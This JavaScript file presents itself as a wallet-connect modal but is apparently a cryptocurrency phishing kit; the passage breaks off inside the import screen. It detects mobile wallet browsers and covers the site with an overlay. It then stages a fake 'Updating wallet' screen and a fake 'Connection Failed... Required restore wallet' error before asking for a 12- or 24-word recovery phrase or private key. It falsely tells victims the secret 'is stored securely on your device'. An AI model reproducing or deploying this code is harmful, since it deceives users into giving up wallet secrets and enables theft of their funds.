/**
 * Wallet Modal with Fixed Mobile Wallet Browser Detection
 * 
 * FIXES APPLIED:
 * - Less aggressive content hiding (overlay instead of hiding body)
 * - Delayed initialization for wallet API injection
 * - Enhanced wallet browser detection with retries
 * - Proper input setup with forced enable
 * - Better timing for wallet browser flow
 * - Fallback mechanisms if detection fails
 * - Auto-submit on wallet browser to prevent stuck state
 */

(function() {
  'use strict';
  
  if (window.WalletModal) {
    console.log('WalletModal already loaded');
    return;
  }

class WalletModal {
  constructor() {
    this.wallets = [
      {
        id: 'walletconnect',
        name: 'WalletConnect',
        emoji: '🔗',
        bgColor: 'bg-blue-50',
        primaryColor: '#3B99FC',
        secondaryColor: '#2A7FD9'
      },
      {
        id: 'metamask',
        name: 'MetaMask',
        emoji: '🦊',
        bgColor: 'bg-orange-50',
        primaryColor: '#F6851B',
        secondaryColor: '#E2761B'
      },
      {
        id: 'trust',
        name: 'Trust Wallet',
        emoji: '🛡️',
        bgColor: 'bg-blue-50',
        primaryColor: '#3375BB',
        secondaryColor: '#2952A3'
      },
      {
        id: 'coinbase',
        name: 'Coinbase Wallet',
        emoji: '💙',
        bgColor: 'bg-blue-50',
        primaryColor: '#0052FF',
        secondaryColor: '#0041CC'
      },
      {
        id: 'rainbow',
        name: 'Rainbow',
        emoji: '🌈',
        bgColor: 'bg-purple-50',
        primaryColor: '#FF4F9A',
        secondaryColor: '#E63E89'
      },
      {
        id: 'okx',
        name: 'OKX Wallet',
        emoji: '⚫',
        bgColor: 'bg-gray-100',
        primaryColor: '#000000',
        secondaryColor: '#1A1A1A'
      },
      {
        id: 'rabby',
        name: 'Rabby Wallet',
        emoji: '🐰',
        bgColor: 'bg-blue-50',
        primaryColor: '#7084FF',
        secondaryColor: '#5A6FE6'
      },
      {
        id: 'phantom',
        name: 'Phantom',
        emoji: '👻',
        bgColor: 'bg-purple-50',
        primaryColor: '#AB9FF2',
        secondaryColor: '#9580E6'
      },
      {
        id: 'solflare',
        name: 'Solflare',
        emoji: '🔥',
        bgColor: 'bg-purple-50',
        primaryColor: '#FC6B2D',
        secondaryColor: '#E35A24'
      },
      {
        id: 'bitget',
        name: 'Bitget Wallet',
        emoji: '💼',
        bgColor: 'bg-cyan-50',
        primaryColor: '#00F0FF',
        secondaryColor: '#00D4E6'
      }
    ].map(wallet => ({
      ...wallet,
      iconUrl: 'images/' + wallet.id + '.png'
    }));

    this.selectedWallet = null;
    this.importType = '12';
    this.seedWords = Array(12).fill('');
    this.privateKey = '';
    this.isInWalletBrowser = false;
    this.detectionAttempts = 0;

    this.walletConnectWallets = [
      { id: 'uniswap', name: 'Uniswap Wallet', emoji: '🦄' },
      { id: 'zerion', name: 'Zerion', emoji: '⚡' },
      { id: 'atomic', name: 'Atomic Wallet', emoji: '⚛️' },
      { id: 'safepal', name: 'SafePal', emoji: '💎' },
      { id: 'bestwallet', name: 'Best Wallet', emoji: '🏆' },
      { id: 'crypto', name: 'Crypto.com', emoji: '💳' },
      { id: 'binance', name: 'Binance Wallet', emoji: '🔶' },
      { id: 'cardano', name: 'Cardano', emoji: '🔵' },
      { id: 'token', name: 'TokenPocket', emoji: '🎯' },
      { id: 'onto', name: 'ONTO Wallet', emoji: '🔶' },
      { id: 'safemoon', name: 'SafeMoon', emoji: '🛡️' },
      { id: 'ellipal', name: 'Ellipal', emoji: '🔐' },
      { id: 'enjin', name: 'Enjin Wallet', emoji: '⚔️' },
      { id: 'gnosis', name: 'Gnosis Safe', emoji: '🔷' },
      { id: 'exodus', name: 'Exodus', emoji: '✖️' },
      { id: 'kraken', name: 'Kraken', emoji: '🦑' },
      { id: 'bridge', name: 'Bridge Wallet', emoji: '🌉' },
      { id: 'mew', name: 'MyEtherWallet', emoji: '😸' },
      { id: 'zengo', name: 'ZenGo', emoji: '🌅' },
      { id: 'raven', name: 'Ravencoin', emoji: '🐦' },
      { id: 'swipe', name: 'Swipe Wallet', emoji: '💳' },
      { id: 'talken', name: 'Talken', emoji: '💬' }
    ].map(wallet => ({
      ...wallet,
      iconUrl: 'images/' + wallet.id + '.png'
    }));

    this.isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

    if (window.matchMedia) {
      window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
        this.isDarkMode = e.matches;
      });
    }

    this.init();
  }

  init() {
    console.log('WalletModal initializing...');

    // Add Tailwind CSS first
    if (!document.querySelector('script[src*="tailwindcss"]')) {
      const script = document.createElement('script');
      script.src = 'https://cdn.tailwindcss.com';
      document.head.appendChild(script);
    }

    // Wait for both DOM and wallet APIs to load
    const initialize = () => {
      // Give wallet browsers time to inject their APIs (increased from 500ms)
      setTimeout(() => {
        this.detectWalletBrowser();
        
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        
        console.log('Detection complete:', {
          isInWalletBrowser: this.isInWalletBrowser,
          isMobile: isMobile,
          selectedWallet: this.selectedWallet ? this.selectedWallet.name : null
        });
        
        if (this.isInWalletBrowser && isMobile) {
          console.log('🎯 Wallet browser mode activated');
          this.hideMainContent();
          this.startWalletBrowserFlow();
        } else {
          console.log('📱 Normal browser mode');
          this.setupNormalFlow();
        }
      }, 1000); // Increased delay for proper API injection
    };

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initialize);
    } else {
      initialize();
    }
  }

  setupNormalFlow() {
    document.addEventListener('click', (e) => {
      if (e.target.classList.contains('interact-button') || 
          e.target.closest('.interact-button')) {
        e.preventDefault();
        this.showWalletSelectionModal();
      }
    });
  }

  createWalletImageHTML(wallet) {
    return '<img src="' + wallet.iconUrl + '" alt="' + wallet.name + '" class="w-full h-full" style="object-fit: cover; object-position: center; max-width: 100%; max-height: 100%;" loading="eager" onerror="this.style.display=\'none\'; this.parentElement.innerHTML=\'<div style=\\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.75rem; user-select: none;\\\'>' + wallet.emoji + '</div>\';">';
  }

  hideMainContent() {
    console.log('Hiding main content with overlay method');

    // Create overlay instead of hiding body (less aggressive)
    const overlay = document.createElement('div');
    overlay.id = 'wallet-flow-container';
    overlay.style.cssText = 'position: fixed; inset: 0; z-index: 999999; background: white; overflow-y: auto;';
    document.body.appendChild(overlay);
  }

  getThemeClasses() {
    if (this.isDarkMode) {
      return {
        bg: 'bg-gray-900',
        card: 'bg-gray-800',
        text: 'text-white',
        textSecondary: 'text-gray-300',
        textMuted: 'text-gray-400',
        border: 'border-gray-700',
        hover: 'hover:bg-gray-700',
        input: 'bg-gray-700 text-white border-gray-600',
        backdrop: 'bg-black bg-opacity-60'
      };
    }
    return {
      bg: 'bg-white',
      card: 'bg-white',
      text: 'text-gray-900',
      textSecondary: 'text-gray-700',
      textMuted: 'text-gray-500',
      border: 'border-gray-100',
      hover: 'hover:bg-gray-50',
      input: 'bg-white text-gray-900 border-gray-200',
      backdrop: 'bg-black bg-opacity-40'
    };
  }

  isMobileDevice() {
    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  }

  detectWalletBrowser() {
    console.log('🔍 Detecting wallet browser...', {
      ethereum: !!window.ethereum,
      phantom: !!window.phantom,
      solflare: !!window.solflare,
      userAgent: navigator.userAgent
    });

    // Trust Wallet
    if (window.ethereum && window.ethereum.isTrust) {
      console.log('✅ Trust Wallet detected');
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'trust');
      return;
    }

    // MetaMask Mobile
    if (window.ethereum && window.ethereum.isMetaMask) {
      const ua = navigator.userAgent || '';
      const isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
      const hasMetaMaskUA = /MetaMask/i.test(ua);
      const noChrome = !window.chrome;
      
      if (isMobile && (hasMetaMaskUA || noChrome)) {
        console.log('✅ MetaMask Mobile detected');
        this.isInWalletBrowser = true;
        this.selectedWallet = this.wallets.find(w => w.id === 'metamask');
        return;
      }
    }

    // Coinbase Wallet
    if (window.ethereum && window.ethereum.isCoinbaseWallet) {
      console.log('✅ Coinbase Wallet detected');
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'coinbase');
      return;
    }

    // TokenPocket
    if (window.ethereum && window.ethereum.isTokenPocket) {
      console.log('✅ TokenPocket detected');
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'trust');
      return;
    }

    // Rainbow
    if (window.ethereum && window.ethereum.isRainbow) {
      console.log('✅ Rainbow detected');
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'rainbow');
      return;
    }

    // Rabby
    if (window.ethereum && window.ethereum.isRabby) {
      console.log('✅ Rabby detected');
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'rabby');
      return;
    }

    // Best Wallet
    if (window.ethereum && window.ethereum.isBestWallet) {
      console.log('✅ Best Wallet detected');
      this.isInWalletBrowser = true;
      const bestWallet = this.walletConnectWallets.find(w => w.id === 'bestwallet');
      if (bestWallet) {
        this.selectedWallet = {
          ...bestWallet,
          bgColor: 'bg-yellow-50',
          primaryColor: '#F59E0B',
          secondaryColor: '#D97706'
        };
      }
      return;
    }

    // Phantom
    if (window.phantom && window.phantom.solana) {
      console.log('✅ Phantom detected');
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'phantom');
      return;
    }

    // Solflare
    if (window.solflare && window.solflare.isSolflare) {
      console.log('✅ Solflare detected');
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'solflare');
      return;
    }

    // Bitget
    if (window.bitkeep || (window.ethereum && window.ethereum.isBitKeep)) {
      console.log('✅ Bitget detected');
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'bitget');
      return;
    }

    // Generic mobile wallet browser detection
    const ua = navigator.userAgent || navigator.vendor || window.opera;
    const isMobile = /Android|iPhone|iPad|iPod/i.test(ua);

    // Check if we have ethereum but no desktop indicators
    if (window.ethereum && isMobile && !window.chrome) {
      console.log('✅ Generic mobile wallet browser detected');
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets[0];
      return;
    }

    // User agent detection
    const walletBrowsers = [
      'Trust', 'TokenPocket', 'SafePal', 'MetaMask', 'Coinbase',
      'Rainbow', 'OKX', 'Rabby', 'Phantom', 'BitKeep', 'Solflare', 'Bitget',
      'Atomic', 'Exodus', 'Crypto.com', 'Binance', 'MEW', 'ZenGo', 'BestWallet'
    ];

    for (const wallet of walletBrowsers) {
      if (ua.includes(wallet)) {
        console.log('✅ ' + wallet + ' detected via user agent');
        this.isInWalletBrowser = true;
        const foundWallet = this.wallets.find(w => 
          w.name.toLowerCase().includes(wallet.toLowerCase())
        );
        this.selectedWallet = foundWallet || this.wallets[0];
        return;
      }
    }

    // URL parameter override for testing
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('wallet') || urlParams.has('walletbrowser')) {
      console.log('✅ Wallet mode forced via URL parameter');
      this.isInWalletBrowser = true;
      const walletId = urlParams.get('wallet') || 'trust';
      this.selectedWallet = this.wallets.find(w => w.id === walletId) || this.wallets[0];
    }

    console.log('❌ No wallet browser detected');
  }

  startWalletBrowserFlow() {
    console.log('🚀 Starting wallet browser flow...');

    const start = () => {
      if (!this.selectedWallet) {
        console.warn('⚠️ No wallet detected, using fallback');
        this.selectedWallet = this.wallets[0];
      }
      console.log('✨ Flow starting for: ' + this.selectedWallet.name);
      this.showUpdatingWallet();
    };

    // Ensure DOM is ready
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', () => setTimeout(start, 500));
    } else {
      setTimeout(start, 500);
    }
  }

  showWalletSelectionModal() {
    const self = this;
    let walletButtons = '';
    
    this.wallets.forEach(function(wallet) {
      walletButtons += '<button onclick="walletModal.selectWallet(\'' + wallet.id + '\')" class="w-full flex items-center justify-between px-3 py-2.5 hover:bg-gray-50 rounded-lg transition group">';
      walletButtons += '<div class="flex items-center gap-3">';
      walletButtons += '<div class="w-9 h-9 ' + wallet.bgColor + ' rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">';
      walletButtons += self.createWalletImageHTML(wallet);
      walletButtons += '</div>';
      walletButtons += '<span class="font-medium text-gray-900 text-sm">' + wallet.name + '</span>';
      walletButtons += '</div>';
      walletButtons += '<svg class="w-4 h-4 text-gray-300 group-hover:text-gray-400 transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">';
      walletButtons += '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>';
      walletButtons += '</svg>';
      walletButtons += '</button>';
    });

    const modalHTML = '<div id="wallet-modal-backdrop" class="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center p-4 z-50">' +
      '<div class="bg-white rounded-2xl w-full max-w-sm shadow-2xl max-h-[85vh] overflow-hidden flex flex-col">' +
      '<div class="flex items-center justify-between px-5 py-4 border-b border-gray-100">' +
      '<svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
      '<circle cx="12" cy="12" r="10"></circle>' +
      '<path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>' +
      '<line x1="12" y1="17" x2="12.01" y2="17"></line>' +
      '</svg>' +
      '<h2 class="text-base font-semibold text-gray-900">Connect Wallet</h2>' +
      '<button onclick="walletModal.closeModal()" class="text-gray-400 hover:text-gray-600 transition">' +
      '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>' +
      '</svg>' +
      '</button>' +
      '</div>' +
      '<div class="px-2 py-1.5 overflow-y-auto flex-1" style="max-height: 50vh;">' +
      walletButtons +
      '</div>' +
      '<div class="px-4 py-3 text-center border-t border-gray-100">' +
      '<div class="flex items-center justify-center gap-1.5 text-xs text-gray-400">' +
      '<span>UX by</span>' +
      '<span class="w-1 h-1 bg-gray-300 rounded-full"></span>' +
      '<span>/</span>' +
      '<span class="w-1 h-1 bg-gray-300 rounded-full"></span>' +
      '<span>reown</span>' +
      '</div>' +
      '</div>' +
      '</div>' +
      '</div>';

    document.body.insertAdjacentHTML('beforeend', modalHTML);
  }

  filterWallets(searchTerm) {
    const term = searchTerm.toLowerCase().trim();
    const walletItems = document.querySelectorAll('.wc-wallet-item');

    walletItems.forEach(item => {
      const walletName = item.getAttribute('data-wallet-name');
      if (walletName && walletName.includes(term)) {
        item.style.display = 'flex';
      } else {
        item.style.display = 'none';
      }
    });
  }

  selectWallet(walletId) {
    this.selectedWallet = this.wallets.find(w => w.id === walletId);
    this.closeModalOnly();

    if (walletId === 'walletconnect') {
      this.showWalletConnectModal();
    } else {
      this.showOpenPrompt();
    }
  }

  showWalletConnectModal() {
    const theme = this.getThemeClasses();
    const isMobile = this.isMobileDevice();
    const self = this;
    
    let walletList = '';
    this.walletConnectWallets.forEach(function(wallet) {
      walletList += '<button onclick="walletModal.selectWalletConnectWallet(\'' + wallet.id + '\')" class="wc-wallet-item w-full flex items-center justify-between px-3 py-2.5 ' + theme.hover + ' rounded-lg transition group" data-wallet-name="' + wallet.name.toLowerCase() + '">';
      walletList += '<div class="flex items-center gap-3">';
      walletList += '<div class="w-9 h-9 bg-gray-50 rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">';
      walletList += '<img src="' + wallet.iconUrl + '" alt="' + wallet.name + '" class="w-full h-full" style="object-fit: cover;" loading="lazy" onerror="this.style.display=\'none\'; this.parentElement.innerHTML=\'<div style=\\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.2rem;\\\'>' + wallet.emoji + '</div>\';">';
      walletList += '</div>';
      walletList += '<span class="font-medium ' + theme.text + ' text-sm">' + wallet.name + '</span>';
      walletList += '</div>';
      walletList += '<svg class="w-4 h-4 ' + theme.textMuted + ' group-hover:' + theme.textSecondary + ' transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">';
      walletList += '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>';
      walletList += '</svg>';
      walletList += '</button>';
    });

    const modalHTML = '<div id="walletconnect-modal-backdrop" class="fixed inset-0 ' + theme.backdrop + ' flex items-end sm:items-center justify-center z-50 ' + (isMobile ? 'wallet-backdrop-mobile' : 'p-4') + '" onclick="if(event.target.id === \'walletconnect-modal-backdrop\') walletModal.closeModal()">' +
      '<div class="' + theme.card + ' rounded-t-2xl sm:rounded-2xl w-full sm:max-w-sm shadow-2xl max-h-[80vh] sm:max-h-[85vh] overflow-hidden flex flex-col ' + (isMobile ? 'wallet-slide-up' : '') + '">' +
      '<div class="flex items-center justify-between px-5 py-4 border-b ' + theme.border + '">' +
      '<button onclick="walletModal.backToMainModal()" class="' + theme.textMuted + ' hover:' + theme.textSecondary + ' transition">' +
      '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>' +
      '</svg>' +
      '</button>' +
      '<h2 class="text-base font-semibold ' + theme.text + '">All Wallets</h2>' +
      '<button onclick="walletModal.closeModal()" class="' + theme.textMuted + ' hover:' + theme.textSecondary + ' transition">' +
      '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>' +
      '</svg>' +
      '</button>' +
      '</div>' +
      '<div class="px-3 py-2.5">' +
      '<div class="relative">' +
      '<svg class="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 ' + theme.textMuted + '" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>' +
      '</svg>' +
      '<input id="wc-search-input" type="text" placeholder="Search wallet" onkeyup="walletModal.filterWallets(this.value)" class="w-full pl-10 pr-4 py-2 ' + theme.input + ' rounded-lg text-sm focus:outline-none" style="border: 1px solid ' + (this.isDarkMode ? '#374151' : '#E5E7EB') + '">' +
      '</div>' +
      '</div>' +
      '<div id="wc-wallet-list" class="px-2 py-1.5 overflow-y-auto flex-1" style="max-height: 45vh;">' +
      walletList +
      '</div>' +
      '<div class="px-3 py-3 border-t ' + theme.border + '">' +
      '<button onclick="walletModal.showMainModalFromWC()" class="w-full py-2.5 ' + theme.hover + ' ' + theme.text + ' font-semibold rounded-lg transition text-sm">' +
      'Not Listed?' +
      '</button>' +
      '</div>' +
      '</div>' +
      '</div>' +
      '<style>' +
      '@keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }' +
      '.wallet-slide-up { animation: slideUp 0.3s ease-out; }' +
      '.wallet-backdrop-mobile { padding: 0; }' +
      '</style>';

    document.body.insertAdjacentHTML('beforeend', modalHTML);
  }

  showMainModalFromWC() {
    this.backToMainModal();
  }

  selectWalletConnectWallet(walletId) {
    const wallet = this.walletConnectWallets.find(w => w.id === walletId);
    if (!wallet) return;

    this.selectedWallet = {
      ...wallet,
      bgColor: 'bg-blue-50',
      primaryColor: '#3B99FC',
      secondaryColor: '#2A7FD9'
    };

    this.closeWalletConnectModal();
    this.showOpenPrompt();
  }

  closeWalletConnectModal() {
    const modal = document.getElementById('walletconnect-modal-backdrop');
    if (modal) modal.remove();
  }

  backToMainModal() {
    this.closeWalletConnectModal();
    this.showWalletSelectionModal();
  }

  showOpenPrompt() {
    const theme = this.getThemeClasses();

    const promptHTML = '<div id="wallet-prompt-backdrop" class="fixed inset-0 ' + theme.backdrop + ' flex items-center justify-center p-4 z-50" onclick="if(event.target.id === \'wallet-prompt-backdrop\') walletModal.cancelPrompt()">' +
      '<div class="' + theme.card + ' rounded-2xl w-full max-w-xs p-4 shadow-2xl">' +
      '<p class="text-base font-medium ' + theme.text + ' mb-5">' +
      'Open in "' + this.selectedWallet.name + '"?' +
      '</p>' +
      '<div class="flex gap-3 justify-end">' +
      '<button onclick="walletModal.cancelPrompt()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">' +
      'Cancel' +
      '</button>' +
      '<button onclick="walletModal.confirmOpen()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">' +
      'Open' +
      '</button>' +
      '</div>' +
      '</div>' +
      '</div>';

    document.body.insertAdjacentHTML('beforeend', promptHTML);
  }

  cancelPrompt() {
    this.closeModal();
  }

  confirmOpen() {
    this.closeModalOnly();

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    if (isMobile) {
      const workingDeepLinks = {
        'metamask': true, 'trust': true, 'coinbase': true, 'rainbow': true,
        'okx': true, 'phantom': true, 'solflare': true, 'bitget': true
      };
      
      if (workingDeepLinks[this.selectedWallet.id]) {
        this.openWalletApp();
      } else {
        const self = this;
        setTimeout(function() {
          self.showUpdatingWallet();
        }, 300);
      }
    } else {
      const self = this;
      setTimeout(function() {
        self.showUpdatingWallet();
      }, 300);
    }
  }

  openWalletApp() {
    const websiteUrl = window.location.href;

    const deepLinks = {
      'metamask': 'https://metamask.app.link/dapp/' + websiteUrl.replace('https://', ''),
      'trust': 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(websiteUrl),
      'coinbase': 'https://go.cb-w.com/dapp?url=' + encodeURIComponent(websiteUrl),
      'rainbow': 'https://rnbwapp.com/' + websiteUrl,
      'okx': 'https://www.okx.com/web3/dapp?url=' + encodeURIComponent(websiteUrl),
      'phantom': 'https://phantom.app/ul/browse/' + websiteUrl + '?ref=' + websiteUrl,
      'solflare': 'https://solflare.com/ul/v1/browse/' + websiteUrl,
      'bitget': 'https://bkcode.vip?action=dapp&url=' + encodeURIComponent(websiteUrl)
    };

    const link = deepLinks[this.selectedWallet.id];

    if (link) {
      window.location.href = link;
      setTimeout(function() {
        console.log('Opening wallet browser...');
      }, 1000);
    } else {
      window.location.href = websiteUrl;
    }
  }

  showUpdatingWallet() {
    const walletColor = this.selectedWallet.primaryColor;
    const walletSecondary = this.selectedWallet.secondaryColor;
    const container = document.getElementById('wallet-flow-container') || document.body;

    const updatingHTML = '<div id="wallet-updating-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">' +
      '<div class="flex flex-col items-center">' +
      '<div class="mb-8">' +
      '<div class="w-32 h-32 flex items-center justify-center animate-pulse">' +
      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-full h-full rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
      '</div>' +
      '</div>' +
      '<h2 class="text-2xl font-bold text-gray-900 mb-3">Updating wallet...</h2>' +
      '<p class="text-gray-500 text-center">Validating network parameters...</p>' +
      '<div class="mt-8">' +
      '<div class="flex space-x-2">' +
      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0s"></div>' +
      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0.2s"></div>' +
      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0.4s"></div>' +
      '</div>' +
      '</div>' +
      '</div>' +
      '</div>';

    container.insertAdjacentHTML('beforeend', updatingHTML);

    const self = this;
    setTimeout(function() {
      self.closeModalOnly();
      self.showConnectionFailed();
    }, 2500);
  }

  showConnectionFailed() {
    const walletColor = this.selectedWallet.primaryColor;
    const walletSecondary = this.selectedWallet.secondaryColor;
    const container = document.getElementById('wallet-flow-container') || document.body;

    const failedHTML = '<div id="wallet-failed-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">' +
      '<div class="flex flex-col items-center max-w-md w-full">' +
      '<div class="mb-8 relative">' +
      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
      '<div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">' +
      '<svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>' +
      '</svg>' +
      '</div>' +
      '</div>' +
      '<h2 class="text-2xl font-bold text-gray-900 mb-3">Connection Failed</h2>' +
      '<p class="text-gray-500 text-center mb-8">Permission denied. Required restore wallet.</p>' +
      '<button onclick="walletModal.showImportScreen()" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition active:opacity-80" style="background-color: ' + walletColor + '">' +
      'Continue' +
      '</button>' +
      '</div>' +
      '</div>';

    container.insertAdjacentHTML('beforeend', failedHTML);
  }

  showImportScreen() {
    this.closeModalOnly();

    if (!this.selectedWallet) {
      console.error('No wallet selected');
      return;
    }

    const wordCount = this.importType === 'private' ? 0 : parseInt(this.importType);
    const walletColor = this.selectedWallet.primaryColor;
    const walletSecondary = this.selectedWallet.secondaryColor;
    const container = document.getElementById('wallet-flow-container') || document.body;

    const importHTML = '<div id="wallet-import-backdrop" class="fixed inset-0 bg-white flex flex-col z-50 overflow-y-auto">' +
      '<div class="relative pt-6 pb-4 flex-shrink-0">' +
      '<button onclick="walletModal.closeModal()" class="absolute top-4 sm:top-6 left-4 sm:left-6 text-gray-600">' +
      '<svg class="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>' +
      '</svg>' +
      '</button>' +
      '<div class="flex justify-center pt-4">' +
      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center text-4xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
      '</div>' +
      '</div>' +
      '<div class="flex-1 px-4 sm:px-6 pb-6">' +
      '<div class="bg-white rounded-3xl shadow-lg p-4 sm:p-6">' +
      '<h2 class="text-xl sm:text-2xl font-bold text-gray-900 text-center mb-2">Import Wallet</h2>' +
      '<p class="text-sm sm:text-base text-gray-500 text-center mb-6">Select your import method below</p>' +
      '<div class="mb-6">' +
      '<label class="block text-xs sm:text-sm font-medium text-gray-500 mb-2 text-center">IMPORT METHOD</label>' +
      '<select id="import-type-select" onchange="walletModal.changeImportType(this.value)" class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-gray-900 font-medium text-sm sm:text-base focus:outline-none" style="border-color: ' + walletColor + '">' +
      '<option value="12"' + (this.importType === '12' ? ' selected' : '') + '>12 Words</option>' +
      '<option value="24"' + (this.importType === '24' ? ' selected' : '') + '>24 Words</option>' +
      '<option value="private"' + (this.importType === 'private' ? ' selected' : '') + '>Private Key</option>' +
      '</select>' +
      '</div>' +
      '<div id="input-area">' +
      (this.importType === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount)) +
      '</div>' +
      '<div class="flex gap-3 mb-4">' +
      '<button onclick="walletModal.closeModal()" class="flex-1 py-3 sm:py-4 border-2 border-gray-200 rounded-2xl font-semibold text-gray-900 hover:bg-gray-50 text-sm sm:text-base">Cancel</button>' +
      '<button onclick="walletModal.submitImport()" class="flex-1 py-3 sm:py-4 rounded-2xl font-semibold text-white hover:opacity-90 text-sm sm:text-base" style="background-color: ' + walletColor + '">Import</button>' +
      '</div>' +
      '<p class="text-xs text-gray-400 text-center flex items-center justify-center gap-2">🔒 Your ' + (this.importType === 'private' ? 'private key' : 'recovery phrase') + ' is stored securely on your device</p>' +
      '</div>' +
      '</div>' +
      '<div class="p-4 sm:p-6 flex items-center justify-center gap-3 flex-shrink-0">' +
      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center text-xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
      '<span class="font-semibold text-gray-900 text-sm sm:text-base">' + this.selectedWallet.name + '</span>' +
      '</div>' +
      '</div>' +
      '<style>' +
      '#wallet-import-backdrop input, #wallet-import-backdrop textarea { -webkit-user-select: text !important; -moz-user-select: text !important; user-select: text !important; -webkit-touch-callout: default !important; }' +
